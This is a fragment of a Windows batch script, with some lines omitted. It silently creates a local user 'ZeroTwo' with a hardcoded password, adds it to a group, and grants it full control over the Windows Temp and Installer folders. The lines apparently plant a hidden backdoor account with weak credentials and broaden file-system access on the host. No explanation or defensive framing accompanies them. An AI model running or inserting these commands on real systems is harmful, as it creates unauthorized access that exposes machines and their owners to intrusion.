...
net user ZeroTwo asdasdasd /add >nul
net localgroup ZeroTwos ZeroTwo /add >nul
...
ICACLS C:\Windows\Temp /grant ZeroTwo:F >nul
ICACLS C:\Windows\installer /grant ZeroTwo:F >nul
